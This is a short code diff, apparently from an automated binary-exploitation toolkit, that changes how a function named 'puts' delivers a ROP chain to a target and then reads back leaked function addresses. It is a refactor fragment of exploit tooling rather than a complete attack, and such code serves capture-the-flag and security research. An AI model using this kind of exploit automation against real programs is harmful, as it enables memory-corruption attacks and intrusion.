@@ -40,7 +40,7 @@ def puts(state: PwnState) -> PwnState:
     log.info(rop.dump())
 
     state.target.clean(constants.CLEAN_TIME)
-    arutil.call_overwriter(state, rop.chain())
+    state.overwriter(state.target, rop.chain())
 
     for func in LEAK_FUNCS:
         line = state.target.readline()
